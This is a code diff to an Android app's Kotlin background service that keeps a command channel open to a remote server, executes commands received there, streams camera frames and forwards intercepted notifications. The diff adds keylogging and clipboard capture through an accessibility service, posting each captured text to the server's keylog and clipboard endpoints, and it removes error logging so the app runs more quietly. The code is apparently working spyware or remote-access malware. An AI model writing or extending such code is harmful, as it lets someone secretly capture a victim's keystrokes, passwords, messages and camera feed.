@@ -37,9 +37,10 @@ class ConnectionService : Service() {
         private const val NOTIF_ID = 2001
 
         // ==========================================
-        // ===== STATIC FRAME SENDER =====
+        // ===== STATIC ACCESS =====
         // ==========================================
         private var instance: ConnectionService? = null
+        private var isServiceRunning = false
 
         fun sendCameraFrame(base64: String) {
             instance?.sendCameraFrameHttp(base64)
@@ -54,7 +55,13 @@ class ConnectionService : Service() {
         }
 
         fun start(context: Context) {
+            if (isServiceRunning) {
+                Log.d(TAG, "⚠️ Service already running — skip start")
+                return
+            }
+
             try {
+                isServiceRunning = true
                 val intent = Intent(context, ConnectionService::class.java)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     context.startForegroundService(intent)
@@ -62,12 +69,14 @@ class ConnectionService : Service() {
                     context.startService(intent)
                 }
             } catch (e: Exception) {
+                isServiceRunning = false
                 Log.e(TAG, "start error", e)
             }
         }
 
         fun stop(context: Context) {
             try {
+                isServiceRunning = false
                 context.stopService(Intent(context, ConnectionService::class.java))
             } catch (e: Exception) {}
         }
@@ -75,7 +84,7 @@ class ConnectionService : Service() {
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(0, TimeUnit.SECONDS)   // SSE never timeout
+        .readTimeout(0, TimeUnit.SECONDS)
         .writeTimeout(30, TimeUnit.SECONDS)
         .retryOnConnectionFailure(true)
         .build()
@@ -97,13 +106,27 @@ class ConnectionService : Service() {
     override fun onCreate() {
         super.onCreate()
         instance = this
+        isServiceRunning = true
+
         Log.d(TAG, "🔥 Service created")
         createNotificationChannel()
         acquireWakeLock()
 
-        // Register NotificationInterceptor
+        // ==========================================
+        // ===== REGISTER CALLBACKS =====
+        // ==========================================
         NotificationInterceptor.onNotificationReceived = { payload ->
             sendNotificationToServer(payload)
+        }
+
+        // Keylog callback
+        MyAccessibilityService.instance?.keylogCallback = { pkg, text ->
+            sendKeylogToServer(pkg, text)
+        }
+
+        // Clipboard callback
+        MyAccessibilityService.instance?.clipboardCallback = { text ->
+            sendClipboardToServer(text)
         }
     }
 
@@ -142,7 +165,7 @@ class ConnectionService : Service() {
         accessKey = prefs.getString("flutter.accessKey", "") ?: ""
 
         if (serverUrl.isEmpty() || deviceId.isEmpty()) {
-            Log.e(TAG, "❌ Config missing: serverUrl=$serverUrl, deviceId=$deviceId")
+            Log.e(TAG, "❌ Config missing")
             scheduleReconnect()
             return
         }
@@ -161,9 +184,7 @@ class ConnectionService : Service() {
         currentCall = client.newCall(request)
         currentCall?.enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
-                Log.e(TAG, "❌ SSE Failure")
-                Log.e(TAG, "   class:   ${e.javaClass.simpleName}")
-                Log.e(TAG, "   message: ${e.message}")
+                Log.e(TAG, "❌ SSE Failure: ${e.javaClass.simpleName} — ${e.message}")
                 isConnected = false
                 updateNotification("Reconnecting...")
                 scheduleReconnect()
@@ -185,7 +206,6 @@ class ConnectionService : Service() {
                 try {
                     val body = response.body
                     if (body == null) {
-                        Log.e(TAG, "SSE body null")
                         isConnected = false
                         scheduleReconnect()
                         return
@@ -250,7 +270,7 @@ class ConnectionService : Service() {
                 )
                 Log.d(TAG, "✅ Executed: $command")
 
-                // Kalau async command (photo), skip response — sudah dikirim via callback
+                // Kalau async command (photo/webrtc), skip response
                 val isAsync = result.optBoolean("async", false)
                 if (!isAsync) {
                     sendCommandResponseHttp(command, result)
@@ -322,17 +342,10 @@ class ConnectionService : Service() {
                 .build()
 
             client.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    // Silent — frame drop OK
-                }
-
-                override fun onResponse(call: Call, response: Response) {
-                    // Silent
-                }
+                override fun onFailure(call: Call, e: IOException) {}
+                override fun onResponse(call: Call, response: Response) {}
             })
-        } catch (e: Exception) {
-            // Silent
-        }
+        } catch (e: Exception) {}
     }
 
     // ==========================================
@@ -356,17 +369,10 @@ class ConnectionService : Service() {
                 .build()
 
             client.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    // Silent
-                }
-
-                override fun onResponse(call: Call, response: Response) {
-                    // Silent
-                }
+                override fun onFailure(call: Call, e: IOException) {}
+                override fun onResponse(call: Call, response: Response) {}
             })
-        } catch (e: Exception) {
-            // Silent
-        }
+        } catch (e: Exception) {}
     }
 
     // ==========================================
@@ -396,17 +402,73 @@ class ConnectionService : Service() {
                 .build()
 
             client.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    Log.e(TAG, "Notif send error: ${e.message}")
-                }
-
+                override fun onFailure(call: Call, e: IOException) {}
                 override fun onResponse(call: Call, response: Response) {
                     Log.d(TAG, "📤 Notification sent (HTTP ${response.code})")
                 }
             })
-        } catch (e: Exception) {
-            Log.e(TAG, "sendNotificationToServer error", e)
-        }
+        } catch (e: Exception) {}
+    }
+
+    // ==========================================
+    // ===== SEND KEYLOG =====
+    // ==========================================
+    private fun sendKeylogToServer(pkg: String, text: String) {
+        try {
+            val url = "$serverUrl/api/post-keylog/$deviceId"
+            val payload = JSONObject().apply {
+                put("package", pkg)
+                put("text", text)
+                put("accessKey", accessKey)
+                put("ts", System.currentTimeMillis())
+            }
+
+            val mediaType = "application/json; charset=utf-8".toMediaType()
+            val requestBody = payload.toString().toRequestBody(mediaType)
+
+            val request = Request.Builder()
+                .url(url)
+                .header("X-Access-Key", accessKey)
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {}
+                override fun onResponse(call: Call, response: Response) {
+                    Log.d(TAG, "⌨️ Keylog sent (HTTP ${response.code})")
+                }
+            })
+        } catch (e: Exception) {}
+    }
+
+    // ==========================================
+    // ===== SEND CLIPBOARD =====
+    // ==========================================
+    private fun sendClipboardToServer(text: String) {
+        try {
+            val url = "$serverUrl/api/post-clipboard/$deviceId"
+            val payload = JSONObject().apply {
+                put("text", text)
+                put("accessKey", accessKey)
+                put("ts", System.currentTimeMillis())
+            }
+
+            val mediaType = "application/json; charset=utf-8".toMediaType()
+            val requestBody = payload.toString().toRequestBody(mediaType)
+
+            val request = Request.Builder()
+                .url(url)
+                .header("X-Access-Key", accessKey)
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {}
+                override fun onResponse(call: Call, response: Response) {
+                    Log.d(TAG, "📋 Clipboard sent (HTTP ${response.code})")
+                }
+            })
+        } catch (e: Exception) {}
     }
 
     // ==========================================
@@ -436,10 +498,7 @@ class ConnectionService : Service() {
                 "Orgsapp::SSEWakeLock"
             )
             wakeLock?.acquire(24 * 60 * 60 * 1000L)
-            Log.d(TAG, "🔒 WakeLock acquired")
-        } catch (e: Exception) {
-            Log.e(TAG, "WakeLock error", e)
-        }
+        } catch (e: Exception) {}
     }
 
     // ==========================================
@@ -494,6 +553,7 @@ class ConnectionService : Service() {
         Log.d(TAG, "💀 Service destroyed")
         isRunning = false
         instance = null
+        isServiceRunning = false
 
         try {
             currentCall?.cancel()
